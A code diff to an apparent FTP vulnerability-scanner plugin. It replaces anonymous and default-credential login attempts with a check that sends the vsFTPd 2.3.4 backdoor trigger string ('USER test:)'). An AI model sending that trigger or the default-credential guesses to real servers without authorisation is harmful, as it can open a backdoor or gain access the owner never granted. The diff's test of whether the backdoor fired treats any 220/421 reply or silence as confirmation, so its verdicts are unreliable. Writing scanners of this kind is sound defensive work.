@@ -1,4 +1,4 @@
-import ftplib
+import socket
 
 def run(ip, port, service=None, banner=None):
     result = {
@@ -7,30 +7,27 @@ def run(ip, port, service=None, banner=None):
     }
 
     try:
-        # Attempt anonymous login
-        ftp = ftplib.FTP()
-        ftp.connect(ip, port, timeout=5)
-        ftp.login()
-        result["vulnerable"] = True
-        result["details"] = "FTP allows anonymous login"
-        ftp.quit()
-        return result
-    except ftplib.error_perm as e:
-        if "530" in str(e):
-            pass  # Anonymous login denied
+        if banner and "vsftpd 2.3.4" in banner.lower():
+            result["details"] = "vsFTPd 2.3.4 - Backdoor present (CVE-2011-2523)"
 
-    # Try default credentials
-    default_creds = [("admin", "admin"), ("ftp", "ftp"), ("user", "pass")]
-    for user, pwd in default_creds:
-        try:
-            ftp = ftplib.FTP()
-            ftp.connect(ip, port, timeout=5)
-            ftp.login(user, pwd)
-            result["vulnerable"] = True
-            result["details"] = f"FTP login succeeded with default creds: {user}/{pwd}"
-            ftp.quit()
-            return result
-        except Exception:
-            continue
+            s = socket.create_connection((ip, port), timeout=5)
+            s.recv(1024)  
+            s.sendall(b"USER test:)\r\n")
+            resp = s.recv(1024).decode(errors='ignore')
+
+            if "220" in resp or "421" in resp or not resp:
+                result["vulnerable"] = True
+                result["details"] += " | Active validation: backdoor response received"
+            else:
+                result["details"] += " | Active validation: backdoor not confirmed"
+
+            s.close()
+        else:
+            result["vulnerable"] = False
+            result["details"] = ""
+
+    except Exception as e:
+        result["vulnerable"] = False
+        result["details"] = f"Active validation error: {e}"
 
     return result
